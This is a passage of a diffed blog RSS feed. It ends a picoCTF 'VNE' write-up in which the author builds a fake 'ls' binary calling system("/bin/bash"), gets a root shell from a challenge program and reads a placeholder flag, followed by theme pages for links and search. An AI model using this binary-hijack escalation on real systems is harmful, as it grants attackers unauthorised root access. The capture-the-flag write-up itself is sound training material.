+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ctf-player@pico-chall$ echo &amp;#34; system(\&amp;#34;/bin/bash\&amp;#34;);&amp;#34; &amp;gt;&amp;gt; ls.c
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ctf-player@pico-chall$ echo &amp;#34;}&amp;#34; &amp;gt;&amp;gt; ls.c
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ctf-player@pico-chall$ cc ls.c -o ls
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Lets execute!&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">ctf-player@pico-chall$ ./bin
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Listing the content of /root as root:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">root@challenge:/# cd /root
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">root@challenge: /root# cat flag.txt
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">picoCTF{try_to_pwn_VNE_on_your_own}root@challenge: /root# exit
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="disclaimer">Disclaimer
+&lt;/h3>&lt;p>The flag obtained in the command sequence example is obviously an edited version of the real flag. I highly reccomend you to try to solve the VNE problem and obtain its flag on your own.&lt;/p></description></item><item><title>Archives</title><link>https://shuban-789.github.io/archives/</link><pubDate>Sun, 06 Mar 2022 00:00:00 +0000</pubDate><guid>https://shuban-789.github.io/archives/</guid><description/></item><item><title>Links</title><link>https://shuban-789.github.io/links/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://shuban-789.github.io/links/</guid><description>&lt;p>To use this feature, add &lt;code>links&lt;/code> section to frontmatter.&lt;/p>
+&lt;p>This page&amp;rsquo;s frontmatter:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;span class="lnt">7
+&lt;/span>&lt;span class="lnt">8
+&lt;/span>&lt;span class="lnt">9
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-yaml" data-lang="yaml">&lt;span class="line">&lt;span class="cl">&lt;span class="nt">links&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>- &lt;span class="nt">title&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">GitHub&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">description&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">GitHub is the world&amp;#39;s largest software development platform.&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">website&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">https://github.com&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">image&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>- &lt;span class="nt">title&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">TypeScript&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">description&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">TypeScript is a typed superset of JavaScript that compiles to plain JavaScript.&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">website&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">https://www.typescriptlang.org&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">image&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">ts-logo-128.jpg&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;code>image&lt;/code> field accepts both local and external images.&lt;/p></description></item><item><title>Search</title><link>https://shuban-789.github.io/search/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://shuban-789.github.io/search/</guid><description/></item></channel></rss>
